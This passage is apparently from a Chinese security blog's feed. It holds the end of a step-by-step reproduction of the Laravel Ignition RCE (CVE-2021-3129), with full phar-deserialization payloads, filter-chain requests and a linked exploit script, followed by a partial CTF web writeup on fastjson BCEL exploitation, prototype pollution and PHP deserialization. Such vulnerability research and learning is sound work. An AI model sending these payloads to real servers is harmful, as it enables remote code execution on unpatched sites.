json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00r=00Z=00A=00g=00A=00A=00A=00g=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00C=00C=00A=00g=00A=00A=00T=00z=00o=00z=00M=00j=00o=00i=00T=00W=009=00u=00b=002=00x=00v=00Z=001=00x=00I=00Y=00W=005=00k=00b=00G=00V=00y=00X=00F=00N=005=00c=002=00x=00v=00Z=001=00V=00k=00c=00E=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=00j=00E=006=00e=003=00M=006=00O=00T=00o=00i=00A=00C=00o=00A=00c=002=009=00j=00a=002=00V=000=00I=00j=00t=00P=00O=00j=00I=005=00O=00i=00J=00N=00b=002=005=00v=00b=00G=009=00n=00X=00E=00h=00h=00b=00m=00R=00s=00Z=00X=00J=00c=00Q=00n=00V=00m=00Z=00m=00V=00y=00S=00G=00F=00u=00Z=00G=00x=00l=00c=00i=00I=006=00N=00z=00p=007=00c=00z=00o=00x=00M=00D=00o=00i=00A=00C=00o=00A=00a=00G=00F=00u=00Z=00G=00x=00l=00c=00i=00I=007=00T=00z=00o=00y=00O=00T=00o=00i=00T=00W=009=00u=00b=002=00x=00v=00Z=001=00x=00I=00Y=00W=005=00k=00b=00G=00V=00y=00X=00E=00J=001=00Z=00m=00Z=00l=00c=00k=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=00j=00c=006=00e=003=00M=006=00M=00T=00A=006=00I=00g=00A=00q=00A=00G=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=000=004=007=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00U=002=00l=006=00Z=00S=00I=007=00a=00T=00o=00t=00M=00T=00t=00z=00O=00j=00k=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00i=00I=007=00Y=00T=00o=00x=00O=00n=00t=00p=00O=00j=00A=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=003=00O=00i=00J=00w=00a=00H=00B=00p=00b=00m=00Z=00v=00I=00j=00t=00z=00O=00j=00U=006=00I=00m=00x=00l=00d=00m=00V=00s=00I=00j=00t=00O=00O=003=001=009=00c=00z=00o=004=00O=00i=00I=00A=00K=00g=00B=00s=00Z=00X=00Z=00l=00b=00C=00I=007=00T=00j=00t=00z=00O=00j=00E=000=00O=00i=00I=00A=00K=00g=00B=00p=00b=00m=00l=000=00a=00W=00F=00s=00a=00X=00p=00l=00Z=00C=00I=007=00Y=00j=00o=00x=00O=003=00M=006=00M=00T=00Q=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00k=00x=00p=00b=00W=00l=000=00I=00j=00t=00p=00O=00i=000=00x=00O=003=00M=006=00M=00T=00M=006=00I=00g=00A=00q=00A=00H=00B=00y=00b=002=00N=00l=00c=003=00N=00v=00c=00n=00M=00i=00O=002=00E=006=00M=00j=00p=007=00a=00T=00o=00w=00O=003=00M=006=00N=00z=00o=00i=00Y=003=00V=00y=00c=00m=00V=00u=00d=00C=00I=007=00a=00T=00o=00x=00O=003=00M=006=00M=00T=00Q=006=00I=00m=00N=00h=00b=00G=00x=00f=00d=00X=00N=00l=00c=00l=009=00m=00d=00W=005=00j=00I=00j=00t=009=00f=00X=00M=006=00M=00T=00M=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00l=00N=00p=00e=00m=00U=00i=00O=002=00k=006=00L=00T=00E=007=00c=00z=00o=005=00O=00i=00I=00A=00K=00g=00B=00i=00d=00W=00Z=00m=00Z=00X=00I=00i=00O=002=00E=006=00M=00T=00p=007=00a=00T=00o=00w=00O=002=00E=006=00M=00j=00p=007=00a=00T=00o=00w=00O=003=00M=006=00N=00z=00o=00i=00c=00G=00h=00w=00a=00W=005=00m=00b=00y=00I=007=00c=00z=00o=001=00O=00i=00J=00s=00Z=00X=00Z=00l=00b=00C=00I=007=00T=00j=00t=009=00f=00X=00M=006=00O=00D=00o=00i=00A=00C=00o=00A=00b=00G=00V=002=00Z=00W=00w=00i=00O=000=004=007=00c=00z=00o=00x=00N=00D=00o=00i=00A=00C=00o=00A=00a=00W=005=00p=00d=00G=00l=00h=00b=00G=00l=006=00Z=00W=00Q=00i=00O=002=00I=006=00M=00T=00t=00z=00O=00j=00E=000=00O=00i=00I=00A=00K=00g=00B=00i=00d=00W=00Z=00m=00Z=00X=00J=00M=00a=00W=001=00p=00d=00C=00I=007=00a=00T=00o=00t=00M=00T=00t=00z=00O=00j=00E=00z=00O=00i=00I=00A=00K=00g=00B=00w=00c=00m=009=00j=00Z=00X=00N=00z=00b=003=00J=00z=00I=00j=00t=00h=00O=00j=00I=006=00e=002=00k=006=00M=00D=00t=00z=00O=00j=00c=006=00I=00m=00N=001=00c=00n=00J=00l=00b=00n=00Q=00i=00O=002=00k=006=00M=00T=00t=00z=00O=00j=00E=000=00O=00i=00J=00j=00Y=00W=00x=00s=00X=003=00V=00z=00Z=00X=00J=00f=00Z=00n=00V=00u=00Y=00y=00I=007=00f=00X=001=009=00B=00Q=00A=00A=00A=00G=00R=001=00b=00W=001=005=00B=00A=00A=00A=00A=00D=00w=00d=00v=002=00A=00E=00A=00A=00A=00A=00D=00H=005=00/=002=00K=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00C=00A=00A=00A=00A=00H=00R=00l=00c=003=00Q=00u=00d=00H=00h=000=00B=00A=00A=00A=00A=00D=00w=00d=00v=002=00A=00E=00A=00A=00A=00A=00D=00H=005=00/=002=00K=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00d=00G=00V=00z=00d=00H=00R=00l=00c=003=00R=00P=00k=00R=00y=00Q=00r=00k=00B=00t=00D=007=001=003=00E=00z=00J=00P=00B=00n=00I=00w=00c=00c=00v=00F=00o=00A=00I=00A=00A=00A=00B=00H=00Q=00k=001=00C=00=00&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>因为payload比较长，所以是前奇后偶型，注意别忘了在最后还要补上一个 <code>=00</code> 这里已经补上了</p><p>4.1.4 把日志文件转换为仅剩phar数据</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>4.1.5 通过file_get_contents触发phar反序列化</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;phar:///Users/tari/Sites/laravel/storage/logs/laravel.log/test.txt&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>注意这里的路由必须为绝对路径（相对路径试过了会报错）</p><p>不过绝对路径也是已知的，可以通过报错信息获取~</p><p><img src="/img/laravel8-debug-rce/image-20210609001508013.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210609001508013.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210609001508013"></p><h3 id="4-2-脚本利用"><a href="#4-2-脚本利用" class="headerlink" title="4.2 脚本利用"></a>4.2 脚本利用</h3><p>改进了一下原有脚本，可以兼容laravel的<code>artisan serv</code> 和 apache代理（路由后面少个 <code>/</code>）启动模式</p><p>测试PHP版本为 PHP7.3.24 </p><a class="button" href='/static/2021/06/09/cve-2021-3129.py' title='cve-2021-3129.py'><i class='fas fa-download'></i>cve-2021-3129.py</a><p>PHP 8 用不了，可能是因为 monolog 的gadget有问题</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次漏洞踩了的坑很多</p><ul><li>在 base64过滤器里，理解了挺久一些字符串还原特性<sup>[5]</sup>的，然后清空中过滤器与<code>base64_decode</code>函数不同的坑也踩了，原来过滤器中，中间不能用 <code>=</code> 号。顺便深入理解了baes64编码的原理，解码的条件。</li><li>了解了PHP伪协议一些不太常见的过滤器，原来还可以联合起来，配合报错日志这样玩，，这样构造仅有我们想要的内容</li><li>在字节对齐这理解了很久，也是有 <code>=</code> 号产生的坑，做了很多不同实验踩才理解透彻</li></ul><p>虽然 虽然漏洞点不在很深的位置，但是不明显，<code>file_get_contents</code> 和 <code>file_put_contents</code> 都绑定了，当时打ctf遇到这个确实没啥好的思路。</p><p>虽然花了几天复现这个漏洞，不过学了很多新的东西，也对旧的知识（base64、phar等）做了巩固和更深入的理解和应用。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3129">NVD - CVE-2021-3129 (nist.gov)</a></p><p>[2] <a href="https://github.com/advisories/GHSA-4qwp-7c67-jmcc">Unauthenticated remote code execution in Ignition · CVE-2021-3129 · GitHub Advisory Database</a></p><p>[3] <a href="https://zhuanlan.zhihu.com/p/344568679">Laravel Debug模式下远程代码执行漏洞分析 - 知乎 (zhihu.com)</a></p><p>[4] <a href="https://www.ambionics.io/blog/laravel-debug-rce">Laravel &lt;= v8.4.2 debug mode: Remote code execution (ambionics.io)</a></p><p>[5] <a href="https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html?showComment=1542930757921#c4662468249956324472">Orange: HITCON CTF 2018 - One Line PHP Challenge</a></p><p>[6] <a href="https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g">漏洞分析 | Laravel Debug页面RCE（CVE-2021-3129）分析复现 (qq.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
          <category> ignition </category>
          
          <category> Laravel8 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> ignition </tag>
            
            <tag> Laravel8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web writeup | 2021年第一届广东大学生网络安全攻防大赛-晋级赛</title>
      <link href="//p/2021/2021gd-university-ctf/"/>
      <url>//p/2021/2021gd-university-ctf/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>实力吐槽这次比赛</p><ul><li>初赛环境老是炸，最后30多分钟都炸了，答案都提交不了</li><li>晋级塞，，题目也偶尔会出现断开的问题，，第二个web题，，竟然一开始直接返回空，后来又可以了？？不知道是不是只有我遇到这个问题，，晕</li><li>而且，，晋级赛竟然不是uuid式动态flag。。。。？</li></ul><h2 id="old"><a href="#old" class="headerlink" title="old"></a>old</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760418752-b865074d-9996-4124-9701-27a1d538b73f.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760418752-b865074d-9996-4124-9701-27a1d538b73f.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>任意文件读取，不过<code>flag.txt</code> 读不了，但可以看 <code>hint.txt</code>，<code>smali</code> 字节码，提示了 <code>fastjson 1.2.24</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760515093-2a7d7537-dbf4-4af9-8e00-e7a14793ccc3.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760515093-2a7d7537-dbf4-4af9-8e00-e7a14793ccc3.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>先读取本进程相关目录</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760490943-6c4f7d45-000f-4264-9468-0a350d8e903f.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760490943-6c4f7d45-000f-4264-9468-0a350d8e903f.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>在 <code>/usr/local/run/start.jar</code> 获取源码，<code>IDEA</code>打开分析</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760584530-866b5ced-1454-4e9d-a8b0-41d22bea5dac.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760584530-866b5ced-1454-4e9d-a8b0-41d22bea5dac.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>原来过滤了 <code>flag</code> ，怪不得读取不了</p><p>往反序列化方向，不过有<code>waf</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760611948-c43a881f-7f5a-48d9-9d39-8e0414bc6b5a.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760611948-c43a881f-7f5a-48d9-9d39-8e0414bc6b5a.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>然后还有限制</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760625986-96f94ee6-263e-4788-b98c-d11876db5817.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760625986-96f94ee6-263e-4788-b98c-d11876db5817.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>这里卡了挺久，试了网上很多EXP，都不行</p><p>然后突然想起fastjson反序列化的原理</p><p>一般是需要别的库的配合，通过反射获取相关方法的</p><p>于是我一个个依赖找</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760678227-0b26923e-f3e0-4e62-bac0-a994df337c10.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760678227-0b26923e-f3e0-4e62-bac0-a994df337c10.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>搜了下 spring ，没有相关漏洞，但是在 <code>tomcat dbcp</code> 里刚好发现了可以利用，而且不用利用 <code>rmi ldap</code> 之类的</p><p><a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html">https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html</a></p><p>然后刚好用到 <code>BCEL</code>，HFCTF2021也刚好用到， 刚好复现过了，所以非常熟练 （</p><p><a href="https://github.com/f1tz/BCELCodeman">https://github.com/f1tz/BCELCodeman</a></p><p>编写 <code>java poc</code>，转换为 <code>class</code> 然后生成 <code>BCEL</code> 码</p><p>这样可以<code>绕过waf的黑名单</code>，即绕过了第1个<code>challenge</code></p><p>还有2个 <code>challenge</code>，这个简单，就长度大于<code>2000</code>，然后需要包含 <code>flag</code> 关键字</p><p>这里直接把 <code>/flag.txt </code>改一下名读取即可</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760281491-24e583bd-f4a6-455b-8f81-454db979a055.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760281491-24e583bd-f4a6-455b-8f81-454db979a055.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760259579-5427e664-5368-4f57-9987-88549b6b215f.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760259579-5427e664-5368-4f57-9987-88549b6b215f.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="try-js"><a href="#try-js" class="headerlink" title="try_js"></a>try_js</h2><p>审计源码</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760900456-676ce11e-f365-4e46-8178-35ed0f997d0f.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621760900456-676ce11e-f365-4e46-8178-35ed0f997d0f.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>你要<code>merge</code>，那我可就不困了，明显的原型连污染</p><p>污染一下原型</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621747563253-19998be4-cca8-4fb0-954e-3303d5b6e26a.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621747563253-19998be4-cca8-4fb0-954e-3303d5b6e26a.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>即可成功登录</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621747556064-3db19d2d-38d6-48ed-be87-c3b38b3d59b1.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621747556064-3db19d2d-38d6-48ed-be87-c3b38b3d59b1.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>接下来，就没有然后了，，</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621761110409-02c36c38-e853-465a-91a3-cfbbf400ec65.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621761110409-02c36c38-e853-465a-91a3-cfbbf400ec65.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>除了输入黑名单以外的东西，都是直接断开连接，晕</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621762378351-862f4e86-ab14-41d2-a4b8-5370b88e705a.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621762378351-862f4e86-ab14-41d2-a4b8-5370b88e705a.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>emm 快结束了，，环境就可以了？？？</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621764050245-7c74a0aa-18ea-4ad1-ac16-5d58e7be0164.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621764050245-7c74a0aa-18ea-4ad1-ac16-5d58e7be0164.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>先<code>fuzz</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621763932245-0de521c0-b6ba-4977-b44d-38798871f645.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1621763932245-0de521c0-b6ba-4977-b44d-38798871f645.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><code>.DS_Store</code> 是<code>mac</code>的备份文件，有的小伙伴应该遇到过，就解压了<code>mac</code>的压缩包，莫名其妙多了这个文件</p><p>通过 <code>shellme.php</code> 得知 <code>flag</code> 在 <code>/var/www/flag</code></p><p>然后通过 <code>y0u_w1ll_s3e_Me.txt</code> 知道源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">classname = <span class="string">&quot;SayHi&quot;</span>; </span><br><span class="line"><span class="keyword">$this</span>-&gt;param = <span class="keyword">array</span>(<span class="string">&quot;C&quot;</span>, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;F&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;R&quot;</span>); </span><br><span class="line"><span class="variable">$tmp</span> = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;classname(<span class="keyword">$this</span>-&gt;param); &#125; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">if</span> (strpos(<span class="keyword">$this</span>-&gt;param, <span class="string">&#x27;flag&#x27;</span>) !== <span class="literal">false</span> || strpos(<span class="keyword">$this</span>-&gt;param, <span class="string">&#x27;?&#x27;</span>) !== <span class="literal">false</span> || strpos(<span class="keyword">$this</span>-&gt;param, <span class="string">&#x27;*&#x27;</span>) !== <span class="literal">false</span>) </span><br><span class="line">    &#123; <span class="keyword">die</span>(<span class="string">&#x27;You want to hack me?&#x27;</span>); &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123; <span class="variable">$text</span> = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;classname(<span class="keyword">$this</span>-&gt;param); <span class="keyword">foreach</span> (<span class="variable">$text</span> <span class="keyword">as</span> <span class="variable">$t</span>) &#123; <span class="keyword">echo</span> (<span class="variable">$t</span>); &#125; &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">$this</span>-&gt;checkMethod = <span class="keyword">new</span> Check; </span><br><span 